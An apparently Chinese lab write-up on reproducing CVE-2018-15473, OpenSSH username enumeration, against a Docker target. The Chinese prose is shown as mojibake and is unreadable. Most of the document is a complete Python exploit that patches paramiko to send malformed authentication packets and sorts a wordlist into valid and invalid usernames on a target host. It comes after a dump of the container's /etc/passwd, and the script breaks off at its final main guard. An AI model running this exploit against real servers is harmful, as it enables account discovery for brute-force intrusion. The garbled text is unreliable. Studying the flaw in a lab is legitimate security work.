      <p>æ¼æ´å†…å®¹ï¼šåœ¨OpenSSH 7.7å‰å­˜åœ¨ä¸€ä¸ªç”¨æˆ·åæšä¸¾æ¼æ´ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œå¯ä»¥åˆ¤æ–­æŸä¸ªç”¨æˆ·åæ˜¯å¦å­˜åœ¨äºç›®æ ‡ä¸»æœºä¸­</p>
<p>æ¼æ´ä½œç”¨ï¼šæˆ‘ä»¬ç”¨å¼±å£ä»¤ã€çˆ†ç ´ç­‰æ–¹å¼è¿›è¡Œå°è¯•ç™»å½•æ—¶ï¼Œsshéœ€è¦çš„ç”¨æˆ·åå’Œè´¦æˆ·åä¸ç®¡æ˜¯ä¸€è‡´è¿˜æ˜¯ä¸ä¸€è‡´ï¼Œéƒ½ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªç™»å½•å»¶è¿Ÿçš„å‡è±¡ï¼Œè®©æˆ‘ä»¬ä»¥ä¸ºå¯ä»¥ç™»å½•æˆåŠŸï¼Œå®åˆ™ä¸ç®¡ä½ çš„ç”¨æˆ·åæ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼Œå®ƒéƒ½ä¼šè®©ä½ è¾“å…¥å¯†ç ï¼Œç„¶åå‘Šè¯‰ä½ ç™»å½•å¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»çŸ¥é“å¯¹æ–¹ç”¨æˆ·å‡†ç¡®çš„ç”¨æˆ·åï¼Œè®©æˆ‘ä»¬åœ¨æ¥ä¸‹æ¥ä¸ç®¡æ˜¯å¼±å£ä»¤ç™»å½•è¿˜æ˜¯æš´åŠ›ç ´è§£æ–¹é¢éƒ½å¾ˆæœ‰å¸®åŠ©</p>
<p>åˆ©ç”¨æ¡ä»¶ï¼šOpenSSH ç‰ˆæœ¬&lt;7.7</p>
<p>æ¼æ´å¤ç°ï¼š</p>
<ol>
<li><p>è¿›å…¥dockeræ›´æ”¹å¯†ç ï¼Œæ­¤å¤„æ”¹ä¸º<code>123456</code></p>
</li>
<li><p>sshè¿æ¥dockerï¼ŒæŸ¥çœ‹<code>/etc/passwd</code>æ–‡ä»¶æ¥æŸ¥çœ‹ç”¨æˆ·å</p>
<pre class="line-numbers language-none"><code class="language-none">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false
sshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;sshd:&#x2F;sbin&#x2F;nologin
vulhub:x:1000:1000:,,,:&#x2F;home&#x2F;vulhub:&#x2F;bin&#x2F;bash
example:x:1001:1001:,,,:&#x2F;home&#x2F;example:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>æµ‹è¯•exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># python2 exp.py --port SSHç«¯å£ --userList ç”¨æˆ·åå­—å…¸ IP</span>
<span class="token comment">###########################################################################</span>
<span class="token comment">#                ____                    _____ _____ _    _               #</span>
<span class="token comment">#               / __ \                  / ____/ ____| |  | |              #</span>
<span class="token comment">#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #</span>
<span class="token comment">#              | |  | | '_ \ / _ \ '_ \ \___ \\___ \|  __  |              #</span>
<span class="token comment">#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #</span>
<span class="token comment">#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #</span>
<span class="token comment">#                     | |               Username Enumeration              #</span>
<span class="token comment">#                     |_|                                                 #</span>
<span class="token comment">#                                                                         #</span>
<span class="token comment">###########################################################################</span>
<span class="token comment"># Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #</span>
<span class="token comment"># Vulnerability: CVE-2018-15473                                           #</span>
<span class="token comment"># Affected Versions: OpenSSH version &lt; 7.7                                #</span>
<span class="token comment"># Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #</span>
<span class="token comment"># Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #</span>
<span class="token comment"># Email: Justin.Gardner@SynerComm.com                                     #</span>
<span class="token comment"># Date: August 20, 2018                                                   #</span>
<span class="token comment">###########################################################################</span>

<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> paramiko
<span class="token keyword">import</span> multiprocessing
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> string
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint <span class="token keyword">as</span> rand
<span class="token keyword">from</span> random <span class="token keyword">import</span> choice <span class="token keyword">as</span> choice
<span class="token comment"># store function we will overwrite to malform the packet</span>
old_parse_service_accept <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span>

<span class="token comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span>
<span class="token comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span>
random_username_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token comment"># populate the list</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    random_username_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>

<span class="token comment"># create custom exception</span>
<span class="token keyword">class</span> <span class="token class-name">BadUsername</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token comment"># create malicious "add_boolean" function to malform packet</span>
<span class="token keyword">def</span> <span class="token function">add_boolean</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token comment"># create function to call when username was invalid</span>
<span class="token keyword">def</span> <span class="token function">call_error</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> BadUsername<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span>
<span class="token keyword">def</span> <span class="token function">malform_packet</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    old_add_boolean <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean
    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> add_boolean
    result  <span class="token operator">=</span> old_parse_service_accept<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token comment">#return old add_boolean function so start_client will work again</span>
    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> old_add_boolean
    <span class="token keyword">return</span> result

<span class="token comment"># create function to perform authentication with malformed packet and desired username</span>
<span class="token keyword">def</span> <span class="token function">checkUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># instantiate transport</span>
    transport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        transport<span class="token punctuation">.</span>start_client<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>SSHException<span class="token punctuation">:</span>
        <span class="token comment"># server was likely flooded, retry up to 3 times</span>
        transport<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> tried <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
            tried <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">return</span> checkUsername<span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Failed to negotiate SSH transport'</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        transport<span class="token punctuation">.</span>auth_publickey<span class="token punctuation">(</span>username<span class="token punctuation">,</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> BadUsername<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>AuthenticationException<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token comment">#Successful auth(?)</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"There was an error. Is this the correct version of OpenSSH?"</span><span class="token punctuation">)</span>

<span class="token comment"># function to test target system using the randomly generated usernames</span>
<span class="token keyword">def</span> <span class="token function">checkVulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    vulnerable <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> user <span class="token keyword">in</span> random_username_list<span class="token punctuation">:</span>
        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            vulnerable <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> vulnerable

<span class="token keyword">def</span> <span class="token function">exportJSON</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Valid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Invalid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token keyword">not</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exportCSV</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
    final <span class="token operator">=</span> <span class="token string">"Username, Valid\n"</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        final <span class="token operator">+=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">", "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>
    <span class="token keyword">return</span> final

<span class="token keyword">def</span> <span class="token function">exportList</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
    final <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!\n"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!\n"</span>
    <span class="token keyword">return</span> final

<span class="token comment"># assign functions to respective handlers</span>
paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span> <span class="token operator">=</span> malform_packet
paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_USERAUTH_FAILURE<span class="token punctuation">]</span> <span class="token operator">=</span> call_error

<span class="token comment"># get rid of paramiko logging</span>
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'paramiko.transport'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>NullHandler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

arg_parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hostname'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target hostname or ip address"</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target port"</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--threads'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The number of threads to be used"</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFile'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFormat'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'csv'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>
group <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--username'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The single username to validate"</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--userList'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The list of usernames (one per line) to enumerate through"</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Connecting to host failed. Please check the specified host and port.'</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token comment"># first we run the function to check if host is vulnerable to this CVE</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> checkVulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># most probably the target host is either patched or running a version not affected by this CVE</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Target host most probably is not vulnerable or already patched, exiting..."</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>username<span class="token punctuation">:</span> <span class="token comment">#single username passed in</span>
        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>args<span class="token punctuation">.</span>username<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!"</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>userList<span class="token punctuation">:</span> <span class="token comment">#username list passed in</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>userList<span class="token punctuation">)</span>
        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] File doesn't exist or is unreadable."</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        usernames <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">,</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># map usernames to their respective threads</span>
        pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span>args<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>
        results <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>checkUsername<span class="token punctuation">,</span> usernames<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>outputFile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Cannot write to outputFile."</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'json'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in JSON form."</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'csv'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in CSV form."</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in List form."</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># no usernames passed in</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] No usernames provided to check"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
